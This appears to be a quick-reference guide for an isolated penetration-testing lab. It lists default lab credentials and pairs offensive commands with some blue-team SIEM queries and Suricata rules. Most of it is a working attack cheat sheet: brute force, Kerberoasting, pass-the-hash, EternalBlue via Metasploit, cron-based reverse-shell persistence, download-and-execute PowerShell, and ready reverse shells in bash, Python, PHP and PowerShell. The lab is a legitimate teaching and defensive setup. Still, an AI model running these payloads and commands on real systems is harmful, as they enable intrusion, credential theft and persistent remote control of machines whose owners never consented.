# Quick Reference Guide

## Lab Credentials

### Kali Linux (192.168.100.10)
```
Username: kali
Password: kali
Root Password: toor (or kali)
SSH: Enabled
VNC: Port 5900
```

### Metasploitable (192.168.100.20)
```
Username: msfadmin
Password: msfadmin
Root: root / root (if direct access needed)
MySQL: root / (blank password)
PostgreSQL: postgres / postgres
Tomcat: tomcat / tomcat (admin/admin also works)
SSH: Enabled on port 22
```

### Ubuntu Server (192.168.100.30)
```
Username: ubuntu
Password: ubuntu123
MySQL Root: root / password
SSH: Enabled
Sudo: ubuntu user has sudo access
```

### Windows Server 2019/2022 (192.168.100.40)
```
Domain: LAB.LOCAL
Administrator: Administrator
Password: P@ssw0rd123!
Domain Admin: lab\administrator
Safe Mode Password: P@ssw0rd123!
RDP: Enabled
```

### Security Onion (192.168.100.50)
```
Username: analyst
Password: SecurityOnion123!
Root: root / SecurityOnion123!
Web Interface: https://192.168.100.50
Kibana: https://192.168.100.50:5601
```

### Windows 10 (192.168.100.60)
```
Domain: LAB.LOCAL
Local Admin: localadmin / Admin123!
Domain User: lab\user1 / User123!
Domain User: lab\user2 / User123!
RDP: Enabled
```

---

## Essential Commands

### Network Discovery

#### Host Discovery
```bash
# Quick ping sweep
fping -a -g 192.168.100.0/24 2>/dev/null

# Nmap ping scan
nmap -sn 192.168.100.0/24

# ARP discovery
arp-scan -l --interface eth0
sudo netdiscover -r 192.168.100.0/24

# Passive discovery with responder
sudo responder -I eth0 -A
```

#### Port Scanning
```bash
# Fast scan common ports
nmap -F -T4 192.168.100.20

# Full port scan
nmap -p- -T4 --min-rate 1000 192.168.100.20

# Service version detection
nmap -sV -sC -p- -oA metasploit_scan 192.168.100.20

# UDP top 1000 ports
sudo nmap -sU --top-ports 1000 192.168.100.40

# Vulnerability scan
nmap --script vuln -p- 192.168.100.20
```

#### Service Enumeration
```bash
# All-in-one enum scan
nmap -sV -sC -p- -A -oA full_scan 192.168.100.20

# Specific service scripts
nmap --script=smb-enum-shares,smb-enum-users -p445 192.168.100.40
nmap --script=http-enum -p80 192.168.100.30
```

---

### Web Application Testing

#### Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://192.168.100.30 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Feroxbuster (recursive)
feroxbuster -u http://192.168.100.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Dirsearch
dirsearch -u http://192.168.100.30 -e php,html,js,txt

# FFUF
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.30/FUZZ
```

#### Web Vulnerability Scanning
```bash
# Nikto
nikto -h http://192.168.100.30 -o nikto_results.txt

# WPScan (WordPress)
wpscan --url http://192.168.100.30 --enumerate u,vp,vt

# SQLMap
sqlmap -u "http://192.168.100.30/login.php?id=1" --dbs --batch

# Burp Suite
burpsuite & # Launch Burp for manual testing
```

#### Web Proxies
```bash
# Start Burp proxy on 8080
# Configure browser to use 127.0.0.1:8080

# OWASP ZAP
zap-cli --start
zap-cli spider http://192.168.100.30
zap-cli active-scan http://192.168.100.30
```

---

### Active Directory Enumeration

#### Domain Enumeration
```bash
# Enum4linux
enum4linux -a 192.168.100.40

# CrackMapExec
crackmapexec smb 192.168.100.40 -u '' -p '' --shares
crackmapexec smb 192.168.100.40 -u 'guest' -p '' --users

# LDAP enumeration
ldapsearch -x -H ldap://192.168.100.40 -b "DC=lab,DC=local"

# SMB enumeration
smbclient -L //192.168.100.40 -N
smbmap -H 192.168.100.40
```

#### User Enumeration
```bash
# Impacket GetADUsers
GetADUsers.py -all -dc-ip 192.168.100.40 lab.local/user1:User123!

# Kerbrute user enumeration
kerbrute userenum --dc 192.168.100.40 -d lab.local /usr/share/wordlists/seclists/Usernames/Names/names.txt

# rpcclient
rpcclient -U "" -N 192.168.100.40
  > enumdomusers
  > queryuser [RID]
```

#### BloodHound Collection
```bash
# SharpHound (from Windows)
.\SharpHound.exe -c All -d lab.local --domaincontroller 192.168.100.40

# BloodHound.py (from Kali)
bloodhound-python -d lab.local -u user1 -p User123! -dc dc01.lab.local -ns 192.168.100.40 -c all

# Start Neo4j and BloodHound
sudo neo4j console
bloodhound
```

---

### Password Attacks

#### Hydra - Brute Force
```bash
# SSH brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.30 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# SMB brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.100.40

# RDP brute force
hydra -l administrator -P passwords.txt rdp://192.168.100.40
```

#### Metasploit Auxiliary Modules
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.20
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### Kerberos Attacks
```bash
# AS-REP Roasting
GetNPUsers.py lab.local/ -dc-ip 192.168.100.40 -usersfile users.txt -format hashcat

# Kerberoasting
GetUserSPNs.py lab.local/user1:User123! -dc-ip 192.168.100.40 -request

# Crack with hashcat
hashcat -m 18200 kerberos_hash.txt /usr/share/wordlists/rockyou.txt
```

#### Password Spraying
```bash
# CrackMapExec
crackmapexec smb 192.168.100.40 -u users.txt -p 'Password123!' --continue-on-success

# Spray.sh
for user in $(cat users.txt); do echo "Testing $user"; crackmapexec smb 192.168.100.40 -u $user -p 'Password123!'; sleep 30; done
```

---

### Exploitation

#### Metasploit Framework
```bash
# Start msfconsole
msfconsole -q

# Common Metasploitable exploits
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.20
exploit

# UnrealIRCd backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.20
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.100.10
exploit

# Search for exploits
search vsftpd
search type:exploit platform:linux

# Use auxiliary scanners
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.0/24
run
```

#### Common CVE Exploits
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.100.40
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit

# Samba exploits
searchsploit samba
```

---

### Post-Exploitation

#### Privilege Escalation Scripts
```bash
# Linux
wget http://192.168.100.10:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Windows
certutil -urlcache -f http://192.168.100.10:8000/winPEAS.exe winpeas.exe
winpeas.exe

# Alternative: PowerUp.ps1
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#### Persistence
```bash
# Linux cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "<attacker_public_key>" >> ~/.ssh/authorized_keys

# Windows scheduled task (from meterpreter)
run persistence -X -i 60 -p 4445 -r 192.168.100.10
```

#### Lateral Movement
```bash
# PSExec
impacket-psexec lab/administrator:P@ssw0rd123!@192.168.100.60

# WMIExec
impacket-wmiexec lab/administrator:P@ssw0rd123!@192.168.100.60

# Pass-the-Hash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.100.60

# RDP with pass-the-hash
xfreerdp /u:administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.100.60
```

---

## SIEM Queries (Security Onion)

### Kibana/Elasticsearch Queries

#### Detect Port Scans
```
event.dataset:zeek.conn AND destination.ip:192.168.100.* 
AND NOT source.ip:192.168.100.50
| stats count by source.ip, destination.ip
| where count > 100
```

#### Brute Force Detection
```
event.module:suricata AND alert.signature:*brute*force*
OR
event.dataset:zeek.ssh AND zeek.ssh.auth_attempts > 5
```

#### Suspicious SMB Activity
```
event.dataset:zeek.smb_files OR event.dataset:zeek.dce_rpc
AND (smb.path:*\\C$\\* OR smb.path:*\\ADMIN$\\*)
```

#### Outbound Connections from Servers
```
source.ip:(192.168.100.20 OR 192.168.100.30 OR 192.168.100.40)
AND NOT destination.ip:192.168.100.0/24
AND event.dataset:zeek.conn
```

#### Exploit Detection
```
suricata.eve.alert.signature:*exploit* 
OR suricata.eve.alert.signature:*shellcode*
OR suricata.eve.alert.category:"Attempted Administrator Privilege Gain"
```

### Suricata Rule Examples
```
# Detect Metasploit user-agent
alert http any any -> any any (msg:"Metasploit User-Agent"; content:"Metasploit"; http_user_agent; sid:1000001;)

# Detect reverse shell
alert tcp any any -> 192.168.100.10 4444 (msg:"Possible Reverse Shell"; flags:S; sid:1000002;)
```

---

## File Transfer Methods

### Python HTTP Server
```bash
# On Kali (serve files)
cd /path/to/files
python3 -m http.server 8000

# On target (download)
wget http://192.168.100.10:8000/file.sh
curl http://192.168.100.10:8000/file.sh -o file.sh
```

### SMB Server
```bash
# On Kali
impacket-smbserver share /path/to/share -smb2support

# On Windows target
copy \\192.168.100.10\share\file.exe C:\Temp\file.exe
```

### SCP/SFTP
```bash
# Upload to target
scp file.txt user@192.168.100.30:/tmp/

# Download from target
scp user@192.168.100.30:/etc/passwd ./
```

### Base64 Encoding (Small Files)
```bash
# On Kali
base64 file.txt

# On target
echo "<base64_string>" | base64 -d > file.txt
```

### PowerShell Download
```powershell
# Download file
Invoke-WebRequest -Uri http://192.168.100.10:8000/file.exe -OutFile C:\Temp\file.exe

# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.10:8000/script.ps1')

# Certutil (alternative)
certutil -urlcache -f http://192.168.100.10:8000/file.exe C:\Temp\file.exe
```

---

## Reverse Shells

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/192.168.100.10/4444 0>&1

# Alternative
/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'
```

### Python Reverse Shell
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.100.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

### PHP Reverse Shell
```php
php -r '$sock=fsockopen("192.168.100.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.100.10",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
```

### Netcat Listeners
```bash
# Standard listener
nc -lvnp 4444

# With logging
nc -lvnp 4444 | tee session.log

# Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 192.168.100.10; set LPORT 4444; exploit"
```

### Upgrade Shells
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fully interactive TTY
# In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
# In Kali:
stty raw -echo; fg
# In reverse shell:
export TERM=xterm
stty rows 38 columns 116
```

---

## Troubleshooting

### Network Issues
```bash
# Check Kali network
ip addr show
ip route
ping 192.168.100.1
ping 192.168.100.40

# Check VM network mode (should be NAT or Bridged)
# Verify in VMware/VirtualBox settings

# Flush DNS
sudo systemd-resolve --flush-caches

# Reset network interface
sudo ifconfig eth0 down
sudo ifconfig eth0 up
sudo dhclient eth0
```

### Service Issues
```bash
# Check if service is running
sudo systemctl status ssh
sudo systemctl status apache2

# Restart service
sudo systemctl restart apache2

# Check listening ports
sudo netstat -tulpn
sudo ss -tulpn

# Check firewall
sudo iptables -L -n
sudo ufw status
```

### Cannot Connect to Target
```bash
# Verify target is up
ping 192.168.100.20

# Check specific port
nc -zv 192.168.100.20 80
nmap -p 80 192.168.100.20

# Verify no firewall blocking
sudo iptables -F  # Flush rules (be careful!)

# Check routing
traceroute 192.168.100.20
```

### Metasploit Issues
```bash
# Update Metasploit
sudo apt update
sudo apt install metasploit-framework

# Initialize database
sudo msfdb init
sudo msfdb reinit  # if issues persist

# Check database status
sudo msfdb status

# Start PostgreSQL
sudo systemctl start postgresql
```

### Security Onion Not Capturing
```bash
# Check interface is in promiscuous mode
sudo ip link set eth1 promisc on

# Verify Suricata is running
sudo systemctl status suricata

# Check Zeek
sudo systemctl status zeek

# Restart services
sudo so-elastic-restart
sudo so-zeek-restart
```

---

## VM Snapshot Management

### Recommended Snapshots

**Clean State Snapshots (Take before any testing)**
```
✓ Kali-CleanInstall
✓ Metasploitable-Baseline
✓ Ubuntu-ConfigComplete
✓ WindowsServer-ADConfigured
✓ SecurityOnion-BaselineConfig
✓ Windows10-DomainJoined
```

**Mid-Test Snapshots**
```
✓ AfterInitialAccess
✓ PrivEscAchieved
✓ LateralMovementComplete
```

### Snapshot Commands (VMware)
```bash
# List snapshots
vim-cmd vmsvc/snapshot.get [vmid]

# Create snapshot
vim-cmd vmsvc/snapshot.create [vmid] SnapshotName "Description"

# Revert to snapshot
vim-cmd vmsvc/snapshot.revert [vmid] [snapshotId]
```

### Best Practices
1. Take snapshot before major changes
2. Name snapshots descriptively with date
3. Don't chain too many snapshots (performance)
4. Keep "Clean Baseline" snapshot always
5. Document what state each snapshot represents

---

## Resource Usage Tips

### Optimize VM Performance
```bash
# Check current resources
free -h
df -h
top
htop

# Clear cache (if needed)
sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches

# Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable cups
```

### Running VMs Efficiently
- **Minimum Setup:** Kali + 1 Target + Security Onion
- **Standard Setup:** Kali + Metasploitable + Windows Server + Security Onion
- **Full Lab:** All 6 VMs (requires 32GB+ RAM)

### Recommended Allocations
```
Kali Linux:        4GB RAM, 2 CPU
Metasploitable:    512MB RAM, 1 CPU
Ubuntu Server:     2GB RAM, 1 CPU
Windows Server:    4GB RAM, 2 CPU
Security Onion:    8GB RAM, 4 CPU
Windows 10:        2GB RAM, 1 CPU
-----------------------------------
Total:            ~20.5GB RAM, 11 CPU
```

---

## Wordlist Locations

### Kali Linux Default Wordlists
```bash
# RockYou (most common)
/usr/share/wordlists/rockyou.txt

# Dirb wordlists
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Dirbuster
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SecLists (install if not present)
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Usernames/Names/names.txt

# Metasploit wordlists
/usr/share/metasploit-framework/data/wordlists/
```

### Extract rockyou.txt
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Attack Kill Chain Checklist

### Phase 1: Reconnaissance
- [ ] Network discovery (ping sweep, ARP scan)
- [ ] Port scanning (Nmap full scan)
- [ ] Service enumeration
- [ ] OS fingerprinting
- [ ] OSINT gathering
- [ ] Directory enumeration (web apps)

### Phase 2: Weaponization
- [ ] Identify vulnerabilities
- [ ] Select exploit or attack method
- [ ] Prepare payloads
- [ ] Configure listeners

### Phase 3: Delivery
- [ ] Execute exploit
- [ ] Deliver payload
- [ ] Establish initial access

### Phase 4: Exploitation
- [ ] Gain shell/access
- [ ] Verify access level
- [ ] Stabilize shell

### Phase 5: Installation (Persistence)
- [ ] Create backdoor user
- [ ] Add SSH keys
- [ ] Schedule tasks/cron jobs
- [ ] Install rootkit/implant

### Phase 6: Command & Control
- [ ] Establish C2 channel
- [ ] Maintain access
- [ ] Evade detection

### Phase 7: Actions on Objectives
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Data exfiltration
- [ ] Persistence maintenance
- [ ] Cover tracks

---

## Detection Checklist (Blue Team)

### Monitoring Tasks
- [ ] Review Security Onion alerts hourly
- [ ] Check for unusual network traffic patterns
- [ ] Monitor failed authentication attempts
- [ ] Review Suricata IDS alerts
- [ ] Analyze Zeek connection logs
- [ ] Check for new user accounts
- [ ] Review scheduled tasks/cron jobs
- [ ] Monitor outbound connections
- [ ] Check for suspicious processes
- [ ] Review file system changes

### Incident Response Steps
1. **Identify** - Detect the incident
2. **Contain** - Isolate affected systems
3. **Eradicate** - Remove threat
4. **Recover** - Restore from snapshots
5. **Lessons Learned** - Document findings

---

## Documentation Template

### Attack Documentation
```markdown
# Attack Report: [Target Name]

**Date:** YYYY-MM-DD
**Attacker IP:** 192.168.100.10
**Target IP:** 192.168.100.XX
**Objective:** [Describe goal]

## Reconnaissance
- Scan results:
- Services discovered:
- Vulnerabilities identified:

## Exploitation
- Exploit used:
- CVE (if applicable):
- Initial access method:
- Screenshot/proof:

## Post-Exploitation
- Privileges gained:
- Files accessed:
- Lateral movement:
- Persistence established:

## Detection Analysis
- Was attack detected?: Y/N
- Detection method:
- Alerts generated:
- Recommendations:

## Lessons Learned
-
-

## Remediation
-
-
```

---

## Quick Command Aliases

Add to `~/.bashrc` or `~/.zshrc`:
```bash
# Lab-specific aliases
alias lab-scan='nmap -sV -sC -p- -oA lab_scan 192.168.100.10,20,30,40,50,60'
alias lab-ping='fping -a -g 192.168.100.0/24 2>/dev/null'
alias lab-listen='nc -lvnp 4444'
alias lab-serve='python3 -m http.server 8000'
alias lab-smb='impacket-smbserver share . -smb2support'
alias msfstart='msfconsole -q'
alias lab-ips='echo "Kali: 192.168.100.10\nMetasploitable: 192.168.100.20\nUbuntu: 192.168.100.30\nWin Server: 192.168.100.40\nSec Onion: 192.168.100.50\nWin 10: 192.168.100.60"'
```

---

## Emergency Contacts & Resources

### Documentation
- Lab Setup: `README.md`
- Network Diagram: `NETWORK-DIAGRAM.md`
- This Guide: `QUICK-REFERENCE.md`

### External Resources
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- HackTricks: https://book.hacktricks.xyz/
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

### Cheat Sheets
- Nmap: https://www.stationx.net/nmap-cheat-sheet/
- Metasploit: https://www.comparitech.com/net-admin/metasploit-cheat-sheet/
- PowerShell: https://github.com/PowerShellMafia/PowerSploit/

---

**Last Updated:** 2025-12-15  
**Version:** 1.0  
**Maintained by:** lenoshz  

**⚠️ REMINDER: This lab is for educational purposes only. All activities should be conducted in an isolated environment.**
